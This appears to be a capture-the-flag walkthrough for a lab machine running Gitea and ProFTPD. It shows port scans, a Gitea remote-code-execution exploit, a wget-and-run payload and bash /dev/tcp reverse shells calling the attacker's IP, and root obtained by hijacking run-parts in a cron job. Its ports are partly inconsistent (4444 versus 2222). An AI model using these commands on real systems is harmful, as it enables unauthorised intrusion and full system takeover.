																							               Roquefort Walkthrough
																										
Attacker's Machine: 192.168.49.68
Victim's Machine: 192.168.68.67
export IP=192.168.68.67
	
nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s

21/tcp   open   ftp
22/tcp   open   ssh
2222/tcp open   EtherNetIP-1
3000/tcp open   ppp

nmap -Pn -n -sC -sV -p21,22,2222,3000 $IP --open --stats-every=5s -oN results.txt

21/tcp     open  ftp      ProFTPD 1.3.5b
22/tcp     open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
2222/tcp open  ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open  ppp?


nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
 <!-- nothing -->
 
Port 3000 - Gitea

# Register a new account. 

user: urs
password: admin123

searchsploit gitea
Gitea 1.7.5 - Remote Code Execution                                                                                                             | multiple/webapps/49383.py
https://www.exploit-db.com/exploits/49383

searchsploit -m multiple/webapps/49383.py
nano 49383.py

USERNAME = "urs"                                                                  
PASSWORD = "admin123"
HOST_ADDR = '192.168.49.68'                                                        # Attacker's machine
HOST_PORT = 3000                                                                        # RPORT
URL = 'http://192.168.68.67:3000'                                                   # Victim's machine                                                                                             >
CMD = 'wget http://192.168.49.68:21/shell.sh && bash shell.sh'         # Attacker's python server, use an active port in case there is a firewall

# For this exploit, we need to have a shell ready and a netcat listenin connection
# Creating the reverse shell payload
nano shell.sh
bash -c 'bash -i >& /dev/tcp/192.168.49.68/4444 0>&1'

python3 -m http.server 21

# Netcat listener. Again use an existing port opened on the machine, otherwise you won't get the shell.
nc -lvnp 2222            

# Run the exploit       

python 49383.py               # Got shell

cd /home/chloe
cat local.txt                       # Flag: fba220c886ea3584473d3c2127dfa2ee

Privilege escalation

cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


Aparently we have a script that is missing the absolute path and runs every 5 minutes. Check out the path to see if any of those paths are writable.

find / -writable -type d 2>/dev/null
/usr/local/bin

# Reconfirm with Running linpeas.sh we find that the path /usr/local/bin is writable, so let's create our own bash script that will be executed by root to obtain a shell.

cd /usr/local/bin
nano run-parts
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.49.68/2222 0>&1'
chmod 777 run-parts

nc -lvnp 2222                                   # use a port that is already opened on the target machine, otherwise you don't get the shell
whoami
root
cd /root
cat proof.txt                                      # Flag: 77b8b800edc5a9b39eb5bc7f9cb367de
